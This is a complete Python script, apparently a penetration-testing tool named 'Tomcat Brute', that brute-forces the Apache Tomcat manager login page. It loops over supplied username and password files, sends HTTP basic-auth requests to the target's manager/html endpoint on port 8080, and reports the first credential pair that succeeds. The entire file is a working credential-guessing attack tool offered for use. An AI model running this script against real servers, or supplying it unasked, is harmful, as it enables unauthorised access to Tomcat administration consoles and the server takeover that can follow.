import argparse
import requests
from time import sleep

def brute(user_list, pass_list, url):
    """
    Brute force tomcat manager login with supplied list of usernames and passwords
    Strips out unneeded white space to ensure proper usage
    """
    for user in user_list:
        for password in pass_list:
            user = user.strip()
            password = password.strip()
            res = requests.get(url, auth=(user, password))
            if args.verbose:
                print(f'[-] Attempting {user}:{password}')
                print(f'[-] Response status code: {res.status_code}\n')
                if res.status_code == 200:
                    print(f'\n[+] Success! {user}:{password}\n')
                    exit()
            if res.status_code == 200:
                print(f'\n[+] Success! {user}:{password}\n')
                exit()
            sleep(1)

if __name__ == '__main__':

    parser = argparse.ArgumentParser(
    prog="Tomcat Brute",
    description="A brute force script for Apache Tomcat manager login",
    epilog="The End"
)

    parser.add_argument('-U', '--User', help='Username file', required=True)
    parser.add_argument('-P', '--Pass', help='Password file', required=True)
    parser.add_argument('-t', '--target', help='Target IP address, ex. 127.0.0.1', required=True)
    parser.add_argument('-p', '--path', help='URL path for manager login if not manager/html')
    parser.add_argument('--port', help='Port if not 8080')
    parser.add_argument('-v', '--verbose', help='More verbose output', action='store_true')

    args = parser.parse_args()
    try:
        with open(args.User) as u:
            users = u.readlines()
        with open(args.Pass) as p:
            passwords = p.readlines()
    except Exception as e:
        print(f'Error opening requested file/files: {e}')
    url = args.target
    path = args.path if args.path else 'manager/html'
    port = args.port if args.port else '8080'
    full_url = f'http://{url}:{port}/{path}'

    brute(users, passwords, full_url)
